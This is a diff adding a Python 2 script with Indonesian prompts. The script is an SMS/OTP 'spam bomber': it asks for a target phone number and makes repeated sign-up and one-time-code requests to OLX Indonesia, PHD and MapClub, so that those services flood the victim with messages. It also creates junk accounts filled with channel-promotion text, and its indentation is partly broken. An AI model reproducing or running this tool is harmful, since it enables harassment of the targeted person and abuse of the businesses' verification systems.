@@ -1,0 +1,153 @@
+#!/usr/bin/python2
+M = '\033[1;31m'
+H = '\033[1;32m'
+K = '\033[1;33m'
+U = '\033[1;34m'
+P = '\033[1;35m'
+C = '\033[1;36m'
+W = '\033[1;37m'
+A = '\033[90m'
+
+try:
+	
+	import mechanize, requests, random, sys, os, re
+	from time import sleep
+	from cookielib import LWPCookieJar as Cookie
+	from requests.exceptions import ConnectionError
+
+
+	def Tik(s):
+		for i in s + '\n':
+			sys.stdout.write(i)
+			sys.stdout.flush()
+			sleep(random.random() * 0.0010)
+
+	def MapClub(Phone, Amount):
+		for _ in range(Amount):
+
+			sleep(5)
+			headers = {
+			'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
+			'Referer' : 'https://mapclub.com/id/user/signup'
+			}
+
+			postData = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data = {'phone' : Phone}, allow_redirects = True)
+
+			if 'error' in postData.text:
+				print('\x1b[1;94m|\x1b[1;97mKIRIM SPAM \x1b[1;91mGAGAL')
+			
+			else:
+				print('\x1b[1;94m|\x1b[1;97mKIRIM SPAM\x1b[1;92m BERHASIL')
+
+	def Olx(Phone, Amount):
+		for _ in range(Amount):
+		
+			sleep(5)
+			headers = {
+			'user-agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
+			'referer' : 'https://www.olx.co.id/'
+			}
+	
+			data = {
+			'grantType' : 'phone',
+			'phone' : Phone,
+			'language' : ''
+			}
+		
+			Sess = requests.Session()
+			Sess.cookies = Cookie('.cookieslog')
+			Sess.headers = headers
+		
+			postData = Sess.post('https://www.olx.co.id/api/auth/authenticate', json = data, allow_redirects = True)
+		
+			if 'PIN' and 'token' in postData.text:
+				print('\x1b[1;94m|\x1b[1;97mKIRIM SPAM \x1b[1;92mBERHASIL')
+				Sess.cookies.save()
+			
+			else:
+				print('\x1b[1;94m|\x1b[1;97mKIRIM SPAM \x1b[1;91mGAGAL')
+			
+	
+	def Phd(Phone, Amount):
+	
+		if str(Phone).startswith('08', 0) == True:
+			Phone = Phone.replace('08', '8')
+
+		for _ in range(Amount):
+
+			sleep(5)
+			headers = {
+			'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
+			'Referer' : 'https://www.phd.co.id/en/users/createnewuser'
+			}
+
+			data = {
+			'requests_id' : '',
+			'first_name' : 'Subscribe YT',
+			'last_name' : 'Jejak Cyber',
+			'gender' : 'male',
+			'phone_number' : Phone,
+			'birthday' : '0000-00-00',
+			'username' : 'YouTube@gmail.com',
+			'password' : 'Subscribe 1000x Ya Anying',
+			'agreeterms' : '1'
+			}
+
+			Sess = requests.Session()
+			Sess.cookies = Cookie('.cookieslog')
+			Sess.headers = headers
+
+			postData = Sess.post('http://www.phd.co.id/en/users/createNewUser', data = data , allow_redirects = True)
+			Sess.cookies.save()
+		
+			print('\x1b[1;94m|\x1b[1;97mKIRIM SPAM\x1b[1;92m BERHASIL')
+		
+	def Spam():
+		try:
+			requests.get('http://google.com')
+	
+		except ConnectionError:
+			print
+			print(M+'KONEKSI ERROR!')
+			sys.exit()
+	        try:
+			Phone = raw_input('\x1b[1;94m|\x1b[1;97mNOMOR TARGET: \x1b[1;92m')
+			
+			if len(Phone) < 9:
+				print
+				print(W+'NOMOR TIDAK VALID')
+				sys.exit()
+				
+			else:
+			        pass
+				Olx(Phone, 3)
+				Phd(Phone, 3)
+				MapClub(Phone, 3)
+                                print ("\x1b[1;94m|\x1b[1;92mSELESAI")
+				sys.exit()
+          			
+		except ValueError:
+			print
+			print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
+			sys.exit()
+			
+		except SyntaxError:
+			print
+			print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
+			sys.exit()
+		
+		except NameError:
+			print
+			print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
+			sys.exit()
+		
+		except ConnectionError:
+			print
+			print(M+'TERJADI KESALAHAN JARINGAN !')
+			sys.exit()
+
+except KeyError:	
+        sys.exit()	
+	
+if __name__ == '__main__':
+	Spam()
